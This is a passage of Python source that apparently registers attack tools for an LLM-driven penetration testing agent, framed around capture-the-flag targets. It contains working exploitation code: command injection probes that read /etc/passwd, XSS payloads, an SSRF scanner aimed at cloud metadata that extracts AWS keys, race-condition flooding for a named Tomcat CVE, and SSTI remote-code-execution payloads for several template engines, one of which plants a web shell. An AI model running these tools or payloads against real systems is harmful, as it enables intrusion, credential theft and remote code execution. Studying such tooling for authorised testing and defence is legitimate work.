"""Attack tools — exploitation, injection testing, payload delivery.

Reference: AWE xss_agent, sqli_agent — exploitation patterns
           VulnBot roles/scanner.py, roles/exploiter.py — tool list
"""

from __future__ import annotations

import asyncio
import os as _os_module
import random
import re
import string
import time
from pathlib import Path
from typing import Any, Dict

from darwin.tools.mcp_gateway import MCPGateway, ToolResult


def _parse_hydra_output(stdout: str) -> Dict[str, Any]:
    """Parse hydra output for discovered credentials."""
    credentials = []
    for line in stdout.split("\n"):
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match:
            credentials.append({"username": match.group(1), "password": match.group(2)})
        # Alternative format: host: ... login: ... password: ...
        match2 = re.search(r"\[(\d+)\]\[(\w+)\]\s+host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match2:
            credentials.append({"service": match2.group(2), "username": match2.group(3), "password": match2.group(4)})
    return {"credentials": credentials, "count": len(credentials)}


def _parse_searchsploit_output(stdout: str) -> Dict[str, Any]:
    """Parse searchsploit results for exploits."""
    exploits = []
    for line in stdout.split("\n"):
        # Format: Title | Path
        parts = line.split(" | ")
        if len(parts) >= 2:
            exploits.append({
                "title": parts[0].strip(),
                "path": parts[1].strip(),
            })
    return {"exploits": exploits, "count": len(exploits)}


def _parse_shell_output(stdout: str) -> Dict[str, Any]:
    """Parse generic shell command output — return first 2000 chars as output."""
    return {"output": stdout[:2000], "length": len(stdout)}


def _parse_smbmap_output(stdout: str) -> Dict[str, Any]:
    """Parse smbmap output for SMB shares and permissions."""
    shares = []
    for line in stdout.split("\n"):
        line = line.strip()
        if not line or "IP：" in line or "SMBMap" in line:
            continue
        match = re.match(r"\s*(\S+)\s+(\S+)\s+(\S+)", line)
        if match:
            shares.append({
                "share": match.group(1),
                "permissions": match.group(2),
                "comment": match.group(3) if match.group(3) != "NO" else "",
            })
    return {"shares": shares, "count": len(shares)}


async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
    """Execute a shell command with timeout.

    Sets PGPASSWORD env var to prevent psql from blocking on interactive
    password prompts. Commands that need a password should set PGPASSWORD
    explicitly in their command string (which overrides this default).
    """
    import asyncio, os
    start = time.perf_counter()
    try:
        # Prevent psql/mysql from prompting for interactive passwords
        no_prompt_env = {**os.environ, "PGPASSWORD": ""}
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=no_prompt_env,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="shell_exec",
            success=proc.returncode == 0,
            stdout=stdout.decode("utf-8", errors="replace"),
            stderr=stderr.decode("utf-8", errors="replace"),
            exit_code=proc.returncode or 0,
            elapsed_ms=elapsed,
        )
    except asyncio.TimeoutError:
        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="shell_exec",
            success=False,
            stdout="",
            stderr=f"Timeout after {timeout}s",
            exit_code=-1,
            elapsed_ms=elapsed,
        )


async def _python_request(
    method: str, url: str, data: str = "", headers: str = "",
    timeout: int = 10, insecure: bool = False,
) -> ToolResult:
    """Execute a HTTP request via Python (for complex payloads).

    Uses a temp file to avoid shell escaping issues with special characters
    in URLs and payloads (e.g. single quotes in SQLi).
    """
    import asyncio
    import json
    import tempfile
    import os as _os

    ctx_setup = ""
    if insecure:
        ctx_setup = """
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
"""
    else:
        ctx_setup = "ctx = None"

    script = f"""
import urllib.request, json
{ctx_setup}
url = {json.dumps(url)}
method = {json.dumps(method)}
data = {json.dumps(data)}
headers = {json.dumps(headers)}

req = urllib.request.Request(url, method=method, data=data.encode() if data else None)
if data and method in ('POST', 'PUT', 'PATCH') and 'content-type' not in headers.lower():
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
if headers:
    for h in headers.strip().split('\\\\n'):
        if ':' in h:
            k, v = h.split(':', 1)
            req.add_header(k.strip(), v.strip())

try:
    kwargs = {{"timeout": {timeout}}}
    if ctx is not None:
        kwargs["context"] = ctx
    with urllib.request.urlopen(req, **kwargs) as resp:
        body = resp.read().decode('utf-8', errors='replace')
        print(f"STATUS:{{resp.status}}")
        for k, v in resp.getheaders():
            print(f"HEADER:{{k}}:{{v}}")
        print("BODY_START")
        print(body[:10000])
except Exception as e:
    print(f"ERROR:{{e}}")
"""
    # Write to temp file to avoid shell escaping issues
    fd, tmpath = tempfile.mkstemp(suffix=".py", prefix="darwin_req_")
    try:
        _os.write(fd, script.encode("utf-8"))
        _os.close(fd)
        cmd = f"python3 {tmpath}"
        result = await _run_shell(cmd, timeout=timeout + 5)
    finally:
        try:
            _os.unlink(tmpath)
        except OSError:
            pass
    return result


def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
    """Register all attack/exploitation tools.

    Reference: AWE exploitation agents + VulnBot scanner/exploiter tools
    """

    # ── SQL injection test ──────────────────────────────────────
    async def sqlmap_test(url: str, param: str, technique: str = "BEUSTQ",
                         method: str = "GET", body_format: str = "form",
                         content_type: str = "") -> ToolResult:
        """Run sqlmap against a target parameter.

        Args:
            url: Target URL
            param: Parameter name to test
            technique: SQLi techniques (BEUSTQ)
            method: HTTP method (GET/POST)
            body_format: For POST: "form" (urlencoded) or "json" (JSON body)
            content_type: Custom Content-Type header (overrides body_format)
        """
        # Level 2, risk 1 for speed
        base_cmd = (f"sqlmap -u '{url}' --technique={technique} --batch "
                     f"--level=2 --risk=1 --flush-session --smart "
                     f"--threads=4 --output-dir=/tmp/sqlmap")
        if method.upper() == "POST":
            if body_format == "json":
                # JSON body: {"param":"*"} — sqlmap's injection marker
                ct = content_type or "application/json"
                data_str = f'{{"{param}":"*"}}'
                cmd = f"{base_cmd} --data='{data_str}' --headers='Content-Type: {ct}' 2>&1"
            else:
                # Form-urlencoded (default)
                ct = content_type or "application/x-www-form-urlencoded"
                if ct != "application/x-www-form-urlencoded":
                    cmd = f"{base_cmd} --data='{param}=*' --headers='Content-Type: {ct}' 2>&1"
                else:
                    cmd = f"{base_cmd} --data='{param}=*' 2>&1"
        else:
            cmd = f"{base_cmd} -p {param} 2>&1"
        return await _run_shell(cmd, timeout=25)

    gateway.register(
        name="sqlmap_test",
        func=sqlmap_test,
        description="Test for SQL injection vulnerability using sqlmap. For JSON APIs, set body_format='json'.",
        parameters={
            "url": {"type": "string", "description": "Target URL with parameters"},
            "param": {"type": "string", "description": "Parameter to test for injection"},
            "technique": {"type": "string", "description": "SQLi techniques: B(E)oolean, E(rror), U(nion), S(tacked), T(ime), Q(uery)"},
            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
            "body_format": {"type": "string", "description": "For POST: 'form' (urlencoded) or 'json' (JSON body)"},
            "content_type": {"type": "string", "description": "Custom Content-Type header value"},
        },
    )

    # ── Parallel / Race Condition Tool ────────────────────────────
    async def parallel_request(
        urls: str, method: str = "PUT", body: str = "",
        concurrency: int = 10, delay_ms: int = 0,
    ) -> ToolResult:
        """Send concurrent HTTP requests for race condition exploitation.

        Sends multiple identical requests in parallel with configurable
        concurrency. Used for: Tomcat race condition (WEB-02, CVE-2024-50379),
        TOCTOU attacks (K8S-03), AdminSDHolder SDProp race (AD-23), and any
        vulnerability requiring timed concurrent requests.
        """
        import asyncio, time, urllib.request, urllib.error, ssl, json as _json

        start = time.perf_counter()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        url_list = [u.strip() for u in urls.split(",") if u.strip()]
        if not url_list:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="parallel_request", success=False,
                stdout="", stderr="No URLs provided", exit_code=1,
                elapsed_ms=elapsed,
            )

        data = body.encode() if body else None
        results: list[dict] = []

        async def _send_one(u: str, idx: int):
            """Send a single request and return result."""
            try:
                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0 * (idx % concurrency))
                req = urllib.request.Request(u, data=data, method=method.upper())
                if data:
                    req.add_header("Content-Type", "application/octet-stream")
                loop = asyncio.get_event_loop()
                resp = await loop.run_in_executor(
                    None, lambda: urllib.request.urlopen(req, timeout=15, context=ctx)
                )
                body_text = resp.read().decode("utf-8", errors="replace")
                return {
                    "url": u[:80], "index": idx,
                    "status": resp.status, "response_len": len(body_text),
                    "response_preview": body_text[:200],
                }
            except urllib.error.HTTPError as e:
                return {"url": u[:80], "index": idx, "status": e.code, "error": str(e)}
            except Exception as e:
                return {"url": u[:80], "index": idx, "error": str(e)[:100]}

        # Send all URLs with specified concurrency
        sem = asyncio.Semaphore(min(concurrency, 20))
        async def _with_sem(u, idx):
            async with sem:
                return await _send_one(u, idx)

        tasks = [_with_sem(url_list[i % len(url_list)], i)
                 for i in range(max(len(url_list), concurrency))]
        # Duplicate if fewer URLs than concurrency (for race condition)
        if len(url_list) < concurrency:
            tasks = [_with_sem(url_list[i % len(url_list)], i)
                     for i in range(concurrency)]

        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in batch_results:
            if isinstance(r, Exception):
                results.append({"error": str(r)})
            elif isinstance(r, dict):
                results.append(r)

        elapsed = (time.perf_counter() - start) * 1000
        statuses = [r.get("status", 0) for r in results if isinstance(r, dict)]
        success_count = sum(1 for s in statuses if s in (200, 201, 202, 204))
        unique_statuses = dict((s, statuses.count(s)) for s in set(statuses))

        import re
        all_bodies = " ".join(
            r.get("response_preview", "") for r in results if isinstance(r, dict)
        )
        flag_match = re.search(r'flag\{[^}]+\}', all_bodies)

        summary = (
            f"Parallel {method} requests: {len(results)} sent ({concurrency} concurrent, "
            f"{delay_ms}ms stagger).\n"
            f"Status codes: {unique_statuses}\n"
            f"Successful (2xx): {success_count}/{len(results)}"
        )
        if flag_match:
            summary += f"\nFLAG: {flag_match.group(0)}"

        return ToolResult(
            tool_name="parallel_request", success=success_count > 0,
            stdout=summary + "\n" + _json.dumps(results, indent=2),
            stderr="", exit_code=0 if success_count > 0 else 1,
            elapsed_ms=elapsed,
        )

    gateway.register(
        name="parallel_request",
        func=parallel_request,
        description="Send concurrent/parallel HTTP requests for race condition exploitation. Useful for: Tomcat race condition (WEB-02, CVE-2024-50379 — PUT JSP while racing compilation), TOCTOU attacks, file upload races, and any time-of-check-time-of-use vulnerability. Sends multiple identical requests with controllable concurrency and timing stagger.",
        parameters={
            "urls": {"type": "string", "description": "Comma-separated target URLs (or single URL — will be duplicated for concurrent requests)"},
            "method": {"type": "string", "description": "HTTP method: PUT, POST, GET (default: PUT)"},
            "body": {"type": "string", "description": "Request body content for PUT/POST requests"},
            "concurrency": {"type": "integer", "description": "Number of concurrent requests (default: 10, max: 20)"},
            "delay_ms": {"type": "integer", "description": "Stagger delay in milliseconds between request groups (default: 0 — all at once)"},
        },
    )

    # ── Web fuzzing (ffuf) ──────────────────────────────────────
    gateway.register_shell_tool(
        name="ffuf_fuzz",
        command_template="ffuf -u '{url}' -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302,403 -o /dev/null 2>&1 | head -100",
        description="Fuzz web parameters or paths using ffuf",
        parameters={
            "url": {"type": "string", "description": "Target URL with FUZZ keyword"},
        },
    )

    # ── HTTP request with custom payload ────────────────────────
    async def send_payload(
        url: str, param: str, payload: str, method: str = "GET",
        encode_type: str = "none", body_format: str = "form",
        insecure: bool = False,
    ) -> ToolResult:
        """Send a custom payload to a target. Supports GET query string and
        POST with form-encoded or JSON body."""
        import urllib.parse, json

        # Apply encoding
        encoded_payload = payload
        if encode_type == "url":
            encoded_payload = urllib.parse.quote(payload)
        elif encode_type == "double_url":
            encoded_payload = urllib.parse.quote(urllib.parse.quote(payload))
        elif encode_type == "html_entity":
            encoded_payload = "".join(f"&#{ord(c)};" for c in payload)

        if method.upper() == "GET":
            separator = "&" if "?" in url else "?"
            full_url = f"{url}{separator}{param}={encoded_payload}"
            return await _python_request("GET", full_url, insecure=insecure)
        elif body_format == "json":
            import json as _js
            # If payload looks like complete JSON, use it directly.
            # Otherwise wrap as {param: payload}.
            stripped = encoded_payload.strip()
            if stripped.startswith("{") or stripped.startswith("["):
                try:
                    _js.loads(stripped)
                    body = stripped  # payload is already valid JSON
                except (ValueError, _js.JSONDecodeError):
                    body = _js.dumps({param or "payload": encoded_payload})
            else:
                body = _js.dumps({param or "payload": encoded_payload})
            return await _python_request(
                "POST", url, body,
                headers="Content-Type: application/json",
                insecure=insecure,
            )
        else:
            # If param is empty and payload looks like a complete form body
            # (contains = or &), send it raw — the LLM constructed a
            # multi-parameter payload like "ak=X&sk=Y&Version=Z".
            if not param and ('=' in payload or '&' in payload):
                return await _python_request("POST", url, encoded_payload,
                                            insecure=insecure)
            return await _python_request("POST", url, f"{param}={encoded_payload}",
                                        insecure=insecure)

    gateway.register(
        name="send_payload",
        func=send_payload,
        description="Send an exploitation payload to a target. Supports GET/POST with form or JSON body. Use insecure=true for self-signed TLS.",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter name to inject"},
            "payload": {"type": "string", "description": "Payload string to send"},
            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
            "encode_type": {"type": "string", "description": "Encoding: none|url|double_url|html_entity"},
            "body_format": {"type": "string", "description": "POST body format: form or json (default form)"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── Command injection test ──────────────────────────────────
    async def command_injection_test(url: str, param: str,
                                      insecure: bool = False) -> ToolResult:
        """Test for command injection vulnerability with broad payload coverage."""
        import urllib.request
        import urllib.parse
        import ssl
        from urllib.parse import quote

        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        probes: list[tuple[str, str, str]] = [
            # (payload, encode_type, label)
            (";id", "raw", "semicolon"),
            ("|id", "raw", "pipe"),
            ("`id`", "raw", "backtick"),
            ("$(id)", "raw", "dollar_subshell"),
            (";cat /etc/passwd", "raw", "semicolon_passwd"),
            ("|cat /etc/passwd", "raw", "pipe_passwd"),
            ("%0aid", "none", "url_newline"),
            ("%0d%0aid", "none", "url_crlf"),
            ("||id", "raw", "or_cmd"),
            ("&&id", "raw", "and_cmd"),
            (";whoami", "raw", "semicolon_whoami"),
            ("|whoami", "raw", "pipe_whoami"),
            ("$(cat /etc/passwd)", "raw", "subshell_passwd"),
        ]

        EVIDENCE_PATTERNS = [
            # Only patterns that would NOT appear in normal application output
            ("uid=", "Unix user info from id command"),
            ("gid=", "Unix group info from id command"),
            ("groups=", "id groups output"),
            ("root:x:", "passwd file root entry"),
            ("bin:x:", "passwd system user"),
            ("daemon:x:", "passwd daemon user"),
            ("/bin/bash", "shell path in passwd"),
            ("nobody:x:", "passwd nobody user"),
        ]

        results = []
        all_responses: dict[str, str] = {}
        found_evidence = False

        for probe_cmd, encode_type, label in probes:
            if encode_type == "none":
                # Already URL-encoded, append raw
                joiner = "&" if "?" in url else "?"
                probe_url = f"{url}{joiner}{param}={probe_cmd}"
            else:
                joiner = "&" if "?" in url else "?"
                encoded = urllib.parse.quote(probe_cmd, safe="")
                probe_url = f"{url}{joiner}{param}={encoded}"

            try:
                req = urllib.request.Request(probe_url)
                kwargs = {"timeout": 10}
                if ctx is not None:
                    kwargs["context"] = ctx
                with urllib.request.urlopen(req, **kwargs) as resp:
                    body = resp.read().decode("utf-8", errors="replace")
                    body_lower = body.lower()
                    all_responses[label] = body[:300]

                    matched = []
                    for pattern, desc in EVIDENCE_PATTERNS:
                        if pattern.lower() in body_lower:
                            matched.append(f"{pattern} ({desc})")

                    if matched:
                        found_evidence = True
                        results.append(
                            f"{label}: EXECUTED — evidence: {', '.join(matched[:3])}"
                        )
                    elif body.strip():
                        results.append(
                            f"{label}: no evidence (response: {body[:120].strip()})"
                        )
                    else:
                        results.append(f"{label}: no evidence (empty response)")
            except Exception as e:
                results.append(f"{label}: error - {str(e)[:100]}")

        # If nothing executed but all got responses, include the most distinctive
        # response sample to help the LLM understand what the app returns
        if not found_evidence and all_responses:
            # Detect static endpoints: all probes return identical response
            unique_bodies = set(all_responses.values())
            if len(unique_bodies) == 1:
                static_body = list(unique_bodies)[0]
                results.append(
                    f"STATIC ENDPOINT: All {len(probes)} probes returned the SAME response "
                    f"({static_body[:120]}). This endpoint does NOT execute the input — "
                    f"it returns static content regardless of the parameter value. "
                    f"Do NOT waste time on manual command injection follow-up."
                )
            else:
                # Varied responses — show samples so LLM can analyze
                samples = []
                for label, body in list(all_responses.items())[:3]:
                    samples.append(f"  [{label}] {body[:150]}")
                results.append(
                    f"All {len(probes)} probes returned responses without evidence. "
                    f"{len(unique_bodies)} unique response(s). Samples:\n" + "\n".join(samples)
                )

        return ToolResult(
            tool_name="command_injection_test",
            success=True,
            stdout="\n".join(results),
            stderr="",
            exit_code=0,
            elapsed_ms=0,
        )

    gateway.register(
        name="command_injection_test",
        func=command_injection_test,
        description="Test for command injection using multiple probe techniques",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter to test"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── XSS reflection test ─────────────────────────────────────
    async def xss_reflection_test(url: str, param: str,
                                   method: str = "GET",
                                   insecure: bool = False) -> ToolResult:
        """Test for XSS by checking payload reflection. Auto-retries POST on 405."""
        import urllib.request, urllib.parse, json, urllib.error, ssl

        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        method = method.upper()
        probes = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        results = []

        for probe in probes:
            actual_method = method
            try:
                if actual_method == "POST":
                    data = json.dumps({param: probe}).encode()
                    req = urllib.request.Request(
                        url, data=data, method="POST",
                        headers={"Content-Type": "application/json"},
                    )
                else:
                    qs = urllib.parse.quote(probe)
                    sep = "&" if "?" in url else "?"
                    req = urllib.request.Request(f"{url}{sep}{param}={qs}")

                try:
                    kwargs = {"timeout": 10}
                    if ctx is not None:
                        kwargs["context"] = ctx
                    with urllib.request.urlopen(req, **kwargs) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    if e.code == 405 and method == "GET":
                        # POST-only endpoint — retry once with POST
                        data = json.dumps({param: probe}).encode()
                        req2 = urllib.request.Request(
                            url, data=data, method="POST",
                            headers={"Content-Type": "application/json"},
                        )
                        kwargs2 = {"timeout": 10}
                        if ctx is not None:
                            kwargs2["context"] = ctx
                        with urllib.request.urlopen(req2, **kwargs2) as resp2:
                            body = resp2.read().decode("utf-8", errors="replace")
                        actual_method = "POST"
                        results.append("[auto-switched to POST]")
                    else:
                        raise

                # Check reflection
                if probe in body:
                    results.append(f"REFLECTED: {probe[:40]}... (intact)")
                elif urllib.parse.unquote(probe) in body:
                    results.append(f"REFLECTED: {probe[:40]}... (decoded)")
                else:
                    for keyword in ["<script>", "alert", "onerror"]:
                        if keyword in body:
                            results.append(f"PARTIAL: {probe[:40]}... ({keyword} found)")
                            break
                    else:
                        results.append(f"BLOCKED: {probe[:40]}... (not found)")
            except Exception as e:
                results.append(f"ERROR: {probe[:40]}... - {e}")

        return ToolResult(
            tool_name="xss_reflection_test",
            success=True,
            stdout="\n".join(results),
            stderr="",
            exit_code=0,
            elapsed_ms=0,
        )

    gateway.register(
        name="xss_reflection_test",
        func=xss_reflection_test,
        description="Test for XSS by sending GET/POST payloads and checking reflection",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter to test for XSS"},
            "method": {"type": "string", "description": "HTTP method (GET or POST, default GET)"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── SSRF probe: Internal service discovery via SSRF vector ─────
    async def ssrf_probe(
        ssrf_url: str, url_param: str = "url", port_param: str = "",
        internal_hosts: str = "localhost,127.0.0.1,internal,metadata,169.254.169.254,0.0.0.0,172.17.0.1,172.17.0.2,172.17.0.3,172.17.0.4,172.18.0.1,172.18.0.2,172.18.0.3,host.docker.internal",
        ports: str = "80,443,8080,5000,3000,8000,9200,5984,8500",
        paths: str = "/,/flag,/flag.txt,/admin,/api,/health,/status,/metadata",
        method: str = "GET",
    ) -> ToolResult:
        """Discover internal services through an SSRF vector.

        Given an SSRF endpoint (e.g. http://target/fetch?url=), probe internal
        hosts, ports, and paths to discover services and extract data.
        Returns responses including flags found.
        """
        import asyncio, time, urllib.parse, json as _json
        start = time.perf_counter()
        results: list[dict] = []
        # Normalize list/tuple inputs to comma-separated strings.
        # LLM-generated tool_args may pass lists instead of strings.
        if isinstance(internal_hosts, (list, tuple)):
            internal_hosts = ",".join(str(h) for h in internal_hosts)
        if isinstance(ports, (list, tuple)):
            ports = ",".join(str(p) for p in ports)
        if isinstance(paths, (list, tuple)):
            paths = ",".join(str(p) for p in paths)
        hosts = [h.strip() for h in internal_hosts.split(",") if h.strip()]
        # If the caller provided very few hosts (e.g., LLM specified only
        # "localhost"), merge with the comprehensive defaults. A narrow list
        # is almost always an oversight, not a deliberate restriction.
        # This keeps the tool general — no cloud-provider-specific IPs here.
        _default_hosts_raw = ("localhost,127.0.0.1,internal,metadata,169.254.169.254,"
                              "0.0.0.0,172.17.0.1,172.17.0.2,172.17.0.3,172.17.0.4,"
                              "172.18.0.1,172.18.0.2,172.18.0.3,host.docker.internal")
        _default_hosts = [h.strip() for h in _default_hosts_raw.split(",") if h.strip()]
        if len(hosts) < len(_default_hosts) // 2:
            # User-provided list is narrow — merge with defaults.
            for _dh in _default_hosts:
                if _dh not in hosts:
                    hosts.append(_dh)
        port_list = [p.strip() for p in ports.split(",") if p.strip()]
        path_list = [p.strip() for p in paths.split(",") if p.strip()]

        # Build probe URLs: if the SSRF endpoint takes a full URL, inject internal targets
        probes: list[str] = []
        for h in hosts[:8]:  # Limit to avoid excessive requests
            for pt in port_list[:5]:
                for p in path_list[:4]:
                    inner = f"http://{h}:{pt}{p}"
                    if "?" in ssrf_url:
                        sep = "&" if "?" in ssrf_url else "?"
                        probe_url = f"{ssrf_url}{sep}{url_param}={urllib.parse.quote(inner)}"
                    else:
                        # SSRF endpoint expects the URL appended
                        if ssrf_url.endswith("/"):
                            probe_url = f"{ssrf_url}?{url_param}={urllib.parse.quote(inner)}"
                        else:
                            probe_url = f"{ssrf_url}?{url_param}={urllib.parse.quote(inner)}"
                    probes.append(probe_url)
                    break  # One path per host:port combo
                break  # One port per host initially (iterate if needed)

        # Limit total probes
        probes = probes[:30]
        try:
            for probe_url in probes:
                try:
                    method_flag = "-X POST" if method.upper() == "POST" else ""
                    cmd_line = f"curl -s --max-time 5 {method_flag} '{probe_url}' 2>&1"
                    proc = await asyncio.create_subprocess_shell(
                        cmd_line,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE)
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=8)
                    stdout_s = stdout.decode("utf-8", errors="replace")
                    if stdout_s.strip():
                        # Check for flag in response
                        import re
                        flag_match = re.search(r'flag\{[^}]+\}', stdout_s)
                        # IMDS credential detection: look for AWS/GCP/Azure patterns
                        creds_found = None
                        imds_keys = re.findall(r'"AccessKeyId"\s*:\s*"([^"]+)"', stdout_s)
                        imds_secret = re.findall(r'"SecretAccessKey"\s*:\s*"([^"]+)"', stdout_s)
                        imds_token = re.findall(r'"Token"\s*:\s*"([^"]+)"', stdout_s)
                        if imds_keys and imds_secret:
                            creds_found = {
                                "type": "aws_iam",
                                "access_key_id": imds_keys[0],
                                "secret_access_key": imds_secret[0][:20] + "...",
                                "has_token": bool(imds_token),
                            }
                        results.append({
                            "probe": probe_url,
                            "response_len": len(stdout_s),
                            "response_preview": stdout_s[:500],
                            "flag": flag_match.group(0) if flag_match else None,
                            "credentials_detected": creds_found,
                        })
                        # Stop if flag found
                        if flag_match:
                            break
                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue
        except Exception:
            pass

        elapsed = (time.perf_counter() - start) * 1000
        if results:
            found_flags = [r for r in results if r.get("flag")]
            summary = f"SSRF probe complete: {len(results)} responses, {len(found_flags)} flags found\n"
            summary += _json.dumps(results, indent=2)
            return ToolResult(
                tool_name="ssrf_probe", success=True,
                stdout=summary, stderr="",
                exit_code=0, elapsed_ms=elapsed,
            )
        return ToolResult(
            tool_name="ssrf_probe", success=False,
            stdout="", stderr="No internal services discovered through SSRF vector",
            exit_code=1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="ssrf_probe",
        func=ssrf_probe,
        description="Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, Docker bridge IPs 172.17-18.0.x, host.docker.internal, cloud metadata 169.254.169.254) and ports for accessible services. Uses GET by default, but can also try POST for services like IMDS that require it. IMPORTANT: do NOT restrict internal_hosts to 'localhost' alone — services often run on other containers reachable via Docker bridge IPs. Omit internal_hosts entirely to use the comprehensive defaults. When running inside containers, internal services are on Docker bridge IPs, NOT localhost. Automatically detects IMDS credentials (AccessKeyId/SecretAccessKey pattern) and extracts flags from responses.",
        parameters={
            "ssrf_url": {"type": "string", "description": "The SSRF-vulnerable endpoint URL (e.g. 'http://target:10110/fetch')"},
            "url_param": {"type": "string", "description": "URL parameter name for the SSRF query (default 'url')"},
            "port_param": {"type": "string", "description": "Optional port parameter name if separate from url_param"},
            "internal_hosts": {"type": "string", "description": "Comma-separated internal hosts to probe. LEAVE EMPTY to use defaults (covers localhost, Docker IPs 172.17-18.0.x, cloud metadata 169.254.169.254). Do NOT set to 'localhost' alone — this misses Docker-internal services."},
            "ports": {"type": "string", "description": "Comma-separated ports to probe (default: 80,443,8080,5000,3000)"},
            "paths": {"type": "string", "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"},
            "method": {"type": "string", "description": "HTTP method: GET or POST. Use POST for services like IMDS that require it (default: GET)"},
        },
    )

    # ── SSTI Injection Detection & Exploitation ──────────────────
    async def ssti_inject(
        target_url: str, param_name: str = "name",
        method: str = "GET", template_engine: str = "jinja2",
    ) -> ToolResult:
        """Test for Server-Side Template Injection (SSTI) and attempt exploitation.

        Sends math evaluation payloads to detect SSTI, then attempts RCE.
        """
        import asyncio, time, urllib.parse, urllib.request, json as _json, ssl

        start = time.perf_counter()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        # SSTI detection payloads by engine
        detect_payloads = {
            "jinja2": "{{7*7}}",
            "twig": "{{7*7}}",
            "freemarker": "${7*7}",
            "erb": "<%= 7*7 %>",
            "velocity": "#set($x=7*7)$x",
            "smarty": "{7*7}",
        }
        # RCE payloads
        rce_payloads = {
            "jinja2": [
                "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
                "{{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
            ],
            "twig": [
                "{{_self.env.getFilter('cat /flag.txt')}}",
                "{{['cat /flag.txt']|filter('system')}}",
            ],
            "freemarker": [
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}',
            ],
            "erb": [
                "<%= File.read('/flag.txt') %>",
                "<%= IO.popen('cat /flag.txt').readlines() %>",
            ],
            "smarty": [
                "{system('cat /flag.txt')}",
                "{system('cat /FLAG.txt')}",
                "{system('id')}",
                "{mail('x','x','x','x','-OQueueDirectory=/tmp -X/var/www/html/shell.php')}",
            ],
            "velocity": [
                '#set($x="")$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cat /flag.txt").waitFor()',
                '#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getMethod("getRuntime",null).invoke(null,null).exec("cat /flag.txt"))$ex.waitFor()',
            ],
        }

        results: list[dict] = []

        # Step 1: Detection phase
        engines_to_test = [template_engine] if template_engine != "all" else list(detect_payloads.keys())
        detected = None

        for engine in engines_to_test[:4]:
            payload = detect_payloads.get(engine, "{{7*7}}")
            try:
                if method.upper() == "POST":
                    data = urllib.parse.urlencode({param_name: payload}).encode()
                    req = urllib.request.Request(target_url, data=data)
                else:
                    encoded = urllib.parse.quote(payload)
                    req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")

                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                body = resp.read().decode("utf-8", errors="replace")

                if "49" in body and "7*7" not in body:
                    detected = engine
                    results.append({"phase": "detect", "engine": engine, "payload": payload, "result": "SSTI confirmed — 7*7 evaluated to 49"})
                    break
                elif payload in body:
                    results.append({"phase": "detect", "engine": engine, "payload": payload, "result": "payload reflected (possible SSTI if not raw)"})
                else:
                    results.append({"phase": "detect", "engine": engine, "payload": payload, "result": "no reflection"})
            except Exception as e:
                results.append({"phase": "detect", "engine": engine, "error": str(e)})

        # Step 2: RCE phase (only if SSTI detected)
        if detected and detected in rce_payloads:
            for rce_payload in rce_payloads[detected][:4]:
                try:
                    if method.upper() == "POST":
                        data = urllib.parse.urlencode({param_name: rce_payload}).encode()
                        req = urllib.request.Request(target_url, data=data)
                    else:
                        encoded = urllib.parse.quote(rce_payload)
                        req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")

                    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                    body = resp.read().decode("utf-8", errors="replace")

                    import re
                    flag_match = re.search(r'flag\{[^}]+\}', body)
                    if flag_match:
